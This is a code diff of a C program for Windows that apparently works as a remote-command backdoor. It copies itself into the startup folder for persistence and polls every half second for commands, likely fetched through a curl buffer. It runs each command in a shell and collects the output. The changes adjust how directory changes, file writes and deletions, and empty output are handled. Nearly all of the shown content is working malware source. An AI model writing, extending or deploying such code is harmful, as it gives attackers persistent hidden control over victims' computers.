@@ -9,11 +9,12 @@
 int move_to_startup();
 char *get_exe_name();
 char *get_cmd(const char *cmd);
+_Bool cmd_empty_output(const char *cmd);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     move_to_startup(get_exe_name());
     chdir(getenv("USERPROFILE"));
-    char curl[512], fpath[MAX_PATH];
+    char curl[128], fpath[MAX_PATH];
     sprintf(fpath, "%s\\%s", getenv("TEMP"), FTNAME);
     while(1){
         Sleep(500);                                         // 0.5s delay
@@ -22,10 +23,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if(!command || !strlen(command)) continue;
         if(!strncmp(command, "cd", 2)){                     // changing directory
             chdir(strdup(command+3));
-            command = strdup("echo.");
-        }
-        if(strstr(command, ">") || strstr(command, "del")){ // writing and deleting files
-            get_cmd(command);
             command = strdup("echo.");
         }
         char *result = get_cmd(command);
@@ -89,7 +86,7 @@ char *get_cmd(const char *cmd) {
     free(buffer);
     if(output[0] == '\0'){
         free(output);
-        return NULL;
+        return strdup(" "); //NULL;
     }
     return output;
 }
